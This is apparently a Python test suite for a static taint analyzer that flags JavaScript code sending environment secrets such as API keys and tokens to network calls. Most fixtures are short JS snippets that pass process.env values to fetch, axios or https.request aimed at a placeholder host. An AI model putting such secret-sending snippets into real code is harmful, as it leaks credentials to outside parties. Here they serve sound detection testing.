from backend.guardian.engine import analyze

def flows(files):
    result=analyze(files)
    return [f for f in result[2] if f.rule=='SENSITIVE_TRANSMISSION'],result[4]

def test_function_parameters_returns_and_path():
    found,_=flows({'index.js':'''const first = process.env.API_KEY;
function identity(value) { return value; }
function transmit(data) { fetch("https://example.invalid", {body: data}); }
const intermediate = identity(first);
transmit(intermediate);'''})
    assert len(found)==1
    path=found[0].data_flows[0].steps
    assert {'source','assignment','argument','parameter','return','sink'} <= {s.kind for s in path}
    assert path[0].line==1 and path[-1].line==3
    assert path[-1].column>1

def test_aliased_env_destructured_import_and_object_fields():
    found,_=flows({'index.ts':'''import {post as send} from 'axios';
const environment=process.env;
const {API_KEY: key}=environment;
const object={nested:{value:key},public:"hello"};
const {nested:{value:token}}=object;
send("https://example.invalid", token);'''})
    assert found

def test_shadowed_function_argument_has_separate_identity():
    found,_=flows({'index.js':'''const token = process.env.TOKEN;
function transmit(token) { fetch("https://example.invalid", {body:token}); }
transmit("public");'''})
    assert not found

def test_block_shadowing_and_outer_binding():
    found,_=flows({'index.js':'''let token=process.env.TOKEN;
{ const token="public"; fetch("https://example.invalid", {body:token}); }
fetch("https://example.invalid", {body:token});'''})
    assert len(found)==1 and found[0].evidence[0].line==3

def test_reassignment_kills_taint():
    found,_=flows({'index.js':'let value=process.env.TOKEN; value="public"; fetch("https://example.invalid",{body:value});'})
    assert not found

def test_unrelated_object_property_not_tainted():
    found,_=flows({'index.js':'const o={secret:process.env.TOKEN,public:"hello"}; fetch("https://example.invalid",{body:o.public});'})
    assert not found

def test_object_property_reassignment():
    found,_=flows({'index.js':'const o={data:process.env.TOKEN}; o.data="public"; fetch("https://example.invalid",{body:o.data});'})
    assert not found

def test_object_alias_write():
    found,_=flows({'index.js':'const o={}; const alias=o; alias.data=process.env.TOKEN; fetch("https://example.invalid",{body:o.data});'})
    assert found

def test_esm_export_alias_reexport_and_return():
    found,_=flows({'main.js':'import {forward as go} from "./bridge.js"; go(process.env.TOKEN);','bridge.js':'export {send as forward} from "./helper.js";','helper.js':'export function send(value) { fetch("https://example.invalid",{body:value}); }'})
    assert found
    assert {s.file for s in found[0].data_flows[0].steps} >= {'main.js','helper.js'}

def test_cross_file_exported_sensitive_value():
    found,_=flows({'a.js':'export const token=process.env.TOKEN;','b.js':'import {token as key} from "./a.js"; fetch("https://example.invalid", {body:key});'})
    assert found and found[0].data_flows[0].steps[0].file=='a.js'

def test_commonjs_export_function_and_destructuring():
    found,_=flows({'main.js':'const {send: go}=require("./helper"); go(process.env.TOKEN);','helper.js':'exports.send=function(data){require("https").request("https://example.invalid",{body:data});};'})
    assert found

def test_commonjs_module_exports_function():
    found,_=flows({'a.js':'const send=require("./b"); send(process.env.TOKEN);','b.js':'module.exports=function(value){fetch("https://example.invalid",{body:value});};'})
    assert found

def test_import_hoisted_below_call():
    found,_=flows({'main.js':'send(process.env.TOKEN); import {send} from "./helper.js";','helper.js':'export function send(data){fetch("https://example.invalid", {body:data});}'})
    assert found

def test_two_calls_retain_distinct_origins():
    found,_=flows({'index.js':'function send(x){fetch("https://example.invalid",{body:x});}\nsend(process.env.ONE_TOKEN);\nsend(process.env.TWO_TOKEN);'})
    assert len(found[0].data_flows)==2

def test_authentication_retained_with_context_and_lower_priority():
    found,_=flows({'index.js':'fetch("https://example.invalid",{headers:{Authorization:`Bearer ${process.env.API_TOKEN}`}});'})
    assert found[0].severity=='medium'
    assert found[0].data_flows[0].context=='authentication'

def test_http_write_sink():
    found,_=flows({'index.js':'const req=require("https").request("https://example.invalid");req.write(process.env.TOKEN);'})
    assert found

def test_shadowed_network_builtin_is_not_external_sink():
    found,_=flows({'index.js':'function fetch(x){return x;} fetch(process.env.TOKEN);'})
    assert not found

def test_independent_decode_and_dynamic_execution_not_correlated():
    findings=analyze({'index.js':'const image=Buffer.from("abcd", "base64");eval("1+1");'})[2]
    assert not any(f.rule=='OBFUSCATED_EXECUTION' for f in findings)

def test_unsupported_constructs_disclosed():
    _,coverage=flows({'index.js':'import("./x.js"); require(variable); for(const x of values){fetch(x);} const o=new Fancy();'})
    assert any('Dynamic import' in x for x in coverage)
    assert any('Dynamic require' in x for x in coverage)
    assert any('Loop' in x for x in coverage)

def test_module_cycle_is_bounded_and_disclosed():
    _,coverage=flows({'a.js':'import {b} from "./b.js"; export const a=1;','b.js':'import {a} from "./a.js"; export const b=2;'})
    assert any('Circular' in x for x in coverage)

def test_call_and_module_limits():
    result=analyze({'a.js':'function go(x){go(x);} go(process.env.TOKEN);','b.js':'const x=1;'},limits={'maxModules':1,'maxCalls':1})
    assert any('limit' in c.lower() or 'budget' in c.lower() for c in result[4])

def test_unknown_transform_path_is_low_confidence():
    found,_=flows({'index.js':'const data=unknown(process.env.TOKEN); fetch("https://example.invalid", {body:data});'})
    assert found[0].confidence=='low'

def test_returned_object_preserves_property_precision():
    found,_=flows({'index.js':'function make(){return {secret:process.env.TOKEN,public:"hello"};} const o=make(); fetch("https://example.invalid",{body:o.public});'})
    assert not found

def test_var_hoisting_does_not_connect_outer_secret():
    found,_=flows({'index.js':'const token=process.env.TOKEN;function send(){fetch("https://example.invalid",{body:token});{var token="public";}} send();'})
    assert not found
